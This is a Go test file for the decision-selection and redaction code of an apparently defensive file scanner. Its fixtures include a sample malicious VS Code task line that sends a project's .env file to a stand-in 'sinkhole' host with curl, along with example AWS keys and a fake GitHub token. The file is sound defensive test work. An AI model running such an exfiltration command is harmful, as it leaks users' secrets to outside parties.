package decision_test

import (
	"encoding/json"
	"fmt"
	"reflect"
	"strings"
	"testing"

	"github.com/mrdhira/galahad/internal/decision"
	"github.com/mrdhira/galahad/internal/protocol"
)

func ev(path string, line int, snip string) protocol.Evidence {
	return protocol.Evidence{Path: path, Line: line, Snippet: snip}
}

func finding(rule string, sev protocol.Severity, analyzer string, evidence ...protocol.Evidence) protocol.Finding {
	return protocol.Finding{RuleID: rule, Severity: sev, Title: "Title of " + rule, Analyzer: analyzer, Evidence: evidence}
}

// dfinding is the finding as it is sent.
func dfinding(rule string, sev protocol.Severity, analyzer, path string, line int, snip string) protocol.DecisionFinding {
	return protocol.DecisionFinding{RuleID: rule, Severity: sev, Title: "Title of " + rule, Analyzer: analyzer, Path: path, Line: line, Snippet: snip}
}

func resultOf(kind, name string, findings ...protocol.Finding) protocol.Result {
	return protocol.Result{
		Target:   protocol.Target{Name: name, Kind: kind, FileCount: 6},
		Coverage: protocol.Coverage{FilesSeen: 6, FilesAnalyzed: 5, Truncated: true},
		Findings: findings,
	}
}

func inputOf(kind string, findings []protocol.DecisionFinding, omitted int) protocol.DecisionInput {
	return protocol.DecisionInput{
		Schema:   protocol.DecisionSchema,
		Notice:   protocol.DecisionNotice,
		Target:   protocol.DecisionTarget{Kind: kind, FileCount: 6},
		Coverage: protocol.DecisionCoverage{FilesSeen: 6, FilesAnalyzed: 5, Truncated: true},
		Findings: findings,
		Omitted:  omitted,
	}
}

// many returns n medium findings of one rule, in n files named f000.js, f001.js and so on.
func many(n int) (found []protocol.Finding, sent []protocol.DecisionFinding) {
	for i := range n {
		path := fmt.Sprintf("f%03d.js", i)
		found = append(found, finding("GAL-SCRIPT-001", protocol.SeverityMedium, "script", ev(path, i+1, "eval(x)")))
		sent = append(sent, dfinding("GAL-SCRIPT-001", protocol.SeverityMedium, "script", path, i+1, "eval(x)"))
	}
	// The findings come in the reverse order, so that the order of the request is not the input order.
	for i, j := 0, len(found)-1; i < j; i, j = i+1, j-1 {
		found[i], found[j] = found[j], found[i]
	}
	return found, sent
}

func TestSelect(t *testing.T) {
	const marker = "MARKER-NAME.zip"
	hundred, first24 := many(100)
	tests := []struct {
		name string
		// inputs
		res   protocol.Result
		model string
		// expectations
		wantOK    bool
		wantInput protocol.DecisionInput
		wantErr   bool
	}{
		{
			name: "findings by severity, rule, path and line, one for each rule and path, the first evidence only",
			res: resultOf(protocol.TargetDir, "project",
				finding("GAL-SCRIPT-001", protocol.SeverityLow, "script", ev("a.js", 3, "eval(x)")),
				finding("GAL-AUTOEXEC-010", protocol.SeverityCritical, "autoexec", ev(".vscode/tasks.json", 9, "late"), ev("other.json", 1, "second evidence")),
				finding("GAL-AUTOEXEC-010", protocol.SeverityCritical, "autoexec", ev(".vscode/tasks.json", 2, "first")),
				finding("GAL-AUTOEXEC-010", protocol.SeverityCritical, "autoexec", ev("other/tasks.json", 1, "other")),
				finding("GAL-OBF-002", protocol.SeverityHigh, "script", ev("z.js", 1, "obf")),
				finding("GAL-ARCHIVE-001", protocol.SeverityHigh, "archive", ev("z.js", 1, "zip")),
				finding("GAL-INFO-001", protocol.SeverityInfo, "meta", ev("README.md", 1, "info")),
				finding("GAL-SCRIPT-002", protocol.SeverityMedium, "script", ev("b.js", 2, "b")),
				finding("GAL-SCRIPT-002", protocol.SeverityMedium, "script", ev("a.js", 1, "a")),
			),
			model:  "test/model-1",
			wantOK: true,
			wantInput: inputOf(protocol.TargetDir, []protocol.DecisionFinding{
				dfinding("GAL-AUTOEXEC-010", protocol.SeverityCritical, "autoexec", ".vscode/tasks.json", 2, "first"),
				dfinding("GAL-AUTOEXEC-010", protocol.SeverityCritical, "autoexec", "other/tasks.json", 1, "other"),
				dfinding("GAL-ARCHIVE-001", protocol.SeverityHigh, "archive", "z.js", 1, "zip"),
				dfinding("GAL-OBF-002", protocol.SeverityHigh, "script", "z.js", 1, "obf"),
				dfinding("GAL-SCRIPT-002", protocol.SeverityMedium, "script", "a.js", 1, "a"),
				dfinding("GAL-SCRIPT-002", protocol.SeverityMedium, "script", "b.js", 2, "b"),
				dfinding("GAL-SCRIPT-001", protocol.SeverityLow, "script", "a.js", 3, "eval(x)"),
			}, 0),
		},
		{
			name:      "100 findings give 24 entries and say how many were left out",
			res:       resultOf(protocol.TargetDir, "project", hundred...),
			model:     "test/model-1",
			wantOK:    true,
			wantInput: inputOf(protocol.TargetDir, first24[:24], 76),
		},
		{
			name:  "no finding gives nothing to send",
			res:   resultOf(protocol.TargetDir, "project"),
			model: "test/model-1",
		},
		{
			name:  "info findings alone give nothing to send",
			res:   resultOf(protocol.TargetDir, "project", finding("GAL-INFO-001", protocol.SeverityInfo, "meta", ev("README.md", 1, "info"))),
			model: "test/model-1",
		},
		{
			name: "the name of a file target in a path becomes (target)",
			res: resultOf(protocol.TargetFile, marker,
				finding("GAL-SCRIPT-001", protocol.SeverityMedium, "script", ev(marker, 1, "a")),
				finding("GAL-SCRIPT-001", protocol.SeverityMedium, "script", ev(marker+"!/a.js", 2, "b")),
				finding("GAL-SCRIPT-001", protocol.SeverityMedium, "script", ev("other.js", 3, "c")),
				finding("GAL-SCRIPT-001", protocol.SeverityMedium, "script", ev(marker+"x!/b.js", 4, "d")),
			),
			model:  "test/model-1",
			wantOK: true,
			wantInput: inputOf(protocol.TargetFile, []protocol.DecisionFinding{
				dfinding("GAL-SCRIPT-001", protocol.SeverityMedium, "script", "(target)", 1, "a"),
				dfinding("GAL-SCRIPT-001", protocol.SeverityMedium, "script", "(target)!/a.js", 2, "b"),
				dfinding("GAL-SCRIPT-001", protocol.SeverityMedium, "script", marker+"x!/b.js", 4, "d"),
				dfinding("GAL-SCRIPT-001", protocol.SeverityMedium, "script", "other.js", 3, "c"),
			}, 0),
		},
		{
			name: "a path in a directory target is not changed, even when it equals the name",
			res: resultOf(protocol.TargetDir, "src",
				finding("GAL-SCRIPT-001", protocol.SeverityMedium, "script", ev("src", 1, "a")),
			),
			model:     "test/model-1",
			wantOK:    true,
			wantInput: inputOf(protocol.TargetDir, []protocol.DecisionFinding{dfinding("GAL-SCRIPT-001", protocol.SeverityMedium, "script", "src", 1, "a")}, 0),
		},
		{
			name: "a finding of the host goes without path, line and snippet",
			res: resultOf(protocol.TargetDir, "project",
				finding("GAL-SCRIPT-001", protocol.SeverityLow, "script", ev("a.js", 3, "eval(x)")),
				finding("GAL-NET-001", protocol.SeverityHigh, "network", ev("(network)", 0, "CONNECT "+marker+":443 denied: private address"), ev("(network)", 0, "second")),
			),
			model:  "test/model-1",
			wantOK: true,
			wantInput: inputOf(protocol.TargetDir, []protocol.DecisionFinding{
				dfinding("GAL-NET-001", protocol.SeverityHigh, "network", "", 0, ""),
				dfinding("GAL-SCRIPT-001", protocol.SeverityLow, "script", "a.js", 3, "eval(x)"),
			}, 0),
		},
		{
			name: "a finding of the host alone gives nothing to send",
			res: resultOf(protocol.TargetFile, "page.html",
				finding("GAL-NET-001", protocol.SeverityHigh, "network", ev("(network)", 0, "CONNECT "+marker+":443 denied: private address")),
			),
			model: "test/model-1",
		},
		{
			name:    "a model that is not a model name is an error",
			res:     resultOf(protocol.TargetDir, "project", finding("GAL-SCRIPT-001", protocol.SeverityLow, "script", ev("a.js", 3, "eval(x)"))),
			model:   "not a model",
			wantErr: true,
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			req, ok, err := decision.Select(tt.res, tt.model)

			if (err != nil) != tt.wantErr {
				t.Fatalf("err = %v, want error %t", err, tt.wantErr)
			}
			if ok != tt.wantOK {
				t.Fatalf("ok = %t, want %t", ok, tt.wantOK)
			}
			if !ok {
				return
			}
			if !reflect.DeepEqual(req.Input, tt.wantInput) {
				t.Errorf("input = %+v\nwant    %+v", req.Input, tt.wantInput)
			}
			if req.Model != tt.model || req.PromptFormatVersion != protocol.PromptFormatVersion || !reflect.DeepEqual(req.Questions, protocol.DecisionQuestions()) {
				t.Errorf("model, prompt format version or questions are wrong: %q %d", req.Model, req.PromptFormatVersion)
			}
			if err := req.Validate(); err != nil {
				t.Errorf("Validate() = %v", err)
			}
		})
	}
}

func TestSelectSize(t *testing.T) {
	tests := []struct {
		name string
		// inputs
		char     string // the character of the paths, titles and snippets: it is 6 bytes in the escaped form of the request
		findings int
		// expectations
		wantMaxFindings int
	}{
		{name: "paths and snippets of characters that the report escapes to six bytes", char: "<", findings: 30, wantMaxFindings: 12},
		{name: "ampersands", char: "&", findings: 24, wantMaxFindings: 12},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			var found []protocol.Finding
			for i := range tt.findings {
				path := strings.Repeat(tt.char, protocol.MaxPath-3) + fmt.Sprintf("%03d", i)
				found = append(found, finding(fmt.Sprintf("GAL-SCRIPT-%03d", i), protocol.SeverityMedium, "script", ev(path, 1, strings.Repeat(tt.char, protocol.MaxSnippet))))
			}

			req, ok, err := decision.Select(resultOf(protocol.TargetDir, "project", found...), "test/model-1")

			if err != nil || !ok {
				t.Fatalf("Select() = %t, %v, want a request", ok, err)
			}
			if n := len(req.Input.Findings); n < 1 || n > tt.wantMaxFindings {
				t.Errorf("%d findings, want 1 to %d", n, tt.wantMaxFindings)
			}
			if got := len(req.Input.Findings) + req.Input.Omitted; got != tt.findings {
				t.Errorf("sent %d, omitted %d: together %d, want %d", len(req.Input.Findings), req.Input.Omitted, got, tt.findings)
			}
			decision.Redact(&req)
			if err := req.Validate(); err != nil {
				t.Errorf("Validate() after Redact = %v", err)
			}
			for _, enc := range []func(any) ([]byte, error){json.Marshal, func(v any) ([]byte, error) { return req.Encode() }} {
				data, err := enc(req)
				if err != nil || len(data) > protocol.MaxDecisionRequest {
					t.Errorf("encoded request is %d bytes (%v), want at most %d", len(data), err, protocol.MaxDecisionRequest)
				}
			}
		})
	}
}

func TestSelectLeavesOutTheRestOfTheResult(t *testing.T) {
	tests := []struct {
		name string
		// inputs
		set func(res *protocol.Result, marker string)
	}{
		{name: "target name", set: func(res *protocol.Result, m string) { res.Target.Name = m }},
		{name: "target hash", set: func(res *protocol.Result, m string) { res.Target.SHA256 = m }},
		{name: "tool", set: func(res *protocol.Result, m string) { res.Tool = protocol.Tool{Name: m, Version: m} }},
		{name: "file list", set: func(res *protocol.Result, m string) {
			res.Files = []protocol.FileInfo{{Path: m, Kind: m, SHA256: m}}
		}},
		{name: "IOCs", set: func(res *protocol.Result, m string) {
			res.IOCs = []protocol.IOC{{Type: "url", Value: "https://" + m + "/c", Path: m}}
		}},
		{name: "skipped files", set: func(res *protocol.Result, m string) {
			res.Coverage.Skipped = []protocol.Skip{{Path: m, Reason: protocol.SkipTooLarge}}
			res.Coverage.Analyzers = []string{m}
		}},
		{name: "verdict, score and reasons", set: func(res *protocol.Result, m string) {
			res.Verdict, res.Score, res.Confidence, res.ConfidenceLevel, res.Reasons = protocol.Verdict(m), 77, 88, m, []string{m}
		}},
		{name: "network events", set: func(res *protocol.Result, m string) {
			res.Network = &protocol.Network{Events: []protocol.NetEvent{{Host: m, Port: 443, Decision: protocol.DecisionDenied, Reason: m, Blocked: true, Count: 1}}}
		}},
		{name: "decision", set: func(res *protocol.Result, m string) {
			res.Decision = &protocol.Decision{Provider: m, URL: "https://" + m, Model: m, RequestID: m}
		}},
		{name: "the attack and the second evidence of a finding", set: func(res *protocol.Result, m string) {
			res.Findings[0].Attack = m
			res.Findings[0].Evidence = append(res.Findings[0].Evidence, ev(m, 1, m))
		}},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			const marker = "MARKER-7f3a9c"
			res := resultOf(protocol.TargetFile, "invoice.pdf",
				finding("GAL-SCRIPT-001", protocol.SeverityMedium, "script", ev("invoice.pdf!/a.js", 1, "eval(x)")),
				finding("GAL-NET-001", protocol.SeverityHigh, "network", ev("(network)", 0, "CONNECT host:443 denied")),
			)
			tt.set(&res, marker)

			req, ok, err := decision.Select(res, "test/model-1")

			if err != nil || !ok {
				t.Fatalf("Select() = %t, %v, want a request", ok, err)
			}
			wire, err := req.Encode()
			if err != nil {
				t.Fatal(err)
			}
			escaped, err := json.Marshal(req)
			if err != nil {
				t.Fatal(err)
			}
			for _, data := range [][]byte{wire, escaped} {
				if strings.Contains(string(data), marker) {
					t.Errorf("request holds the marker: %s", data)
				}
			}
		})
	}
}

func TestSelectRedact(t *testing.T) {
	tests := []struct {
		name string
		// inputs
		res protocol.Result
		// expectations
		wantSent   []protocol.DecisionFinding
		wantCounts map[string]int
	}{
		{
			name: "the AWS example keys in the snippet of the task, a token in a path and a title",
			res: func() protocol.Result {
				f := finding("GAL-AUTOEXEC-010", protocol.SeverityCritical, "autoexec",
					ev(".vscode/tasks.json", 7, "AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY curl -s -d @.env https://collect.sinkhole.test/c"))
				g := finding("GAL-SCRIPT-001", protocol.SeverityMedium, "script", ev("ghp_abcdefghijklmnopqrstuvwxyz0123456789/a.js", 1, "x"))
				g.Title = "Token ghp_abcdefghijklmnopqrstuvwxyz0123456789"
				return resultOf(protocol.TargetDir, "project", f, g)
			}(),
			wantSent: []protocol.DecisionFinding{
				{RuleID: "GAL-AUTOEXEC-010", Severity: protocol.SeverityCritical, Title: "Title of GAL-AUTOEXEC-010", Analyzer: "autoexec", Path: ".vscode/tasks.json", Line: 7,
					Snippet: "AWS_ACCESS_KEY_ID=[REDACTED:aws-access-key] AWS_SECRET_ACCESS_KEY=[REDACTED:aws-secret] curl -s -d @.env https://collect.sinkhole.test/c"},
				{RuleID: "GAL-SCRIPT-001", Severity: protocol.SeverityMedium, Title: "Token [REDACTED:github-token]", Analyzer: "script", Path: "[REDACTED:github-token]/a.js", Line: 1, Snippet: "x"},
			},
			wantCounts: map[string]int{"aws-access-key": 1, "aws-secret": 1, "github-token": 2},
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			req, ok, err := decision.Select(tt.res, "test/model-1")
			if err != nil || !ok {
				t.Fatalf("Select() = %t, %v, want a request", ok, err)
			}

			counts := decision.Redact(&req)

			if !reflect.DeepEqual(req.Input.Findings, tt.wantSent) {
				t.Errorf("findings = %+v\nwant       %+v", req.Input.Findings, tt.wantSent)
			}
			if !reflect.DeepEqual(counts, tt.wantCounts) {
				t.Errorf("counts = %v, want %v", counts, tt.wantCounts)
			}
			if err := req.Validate(); err != nil {
				t.Errorf("Validate() = %v", err)
			}
		})
	}
}
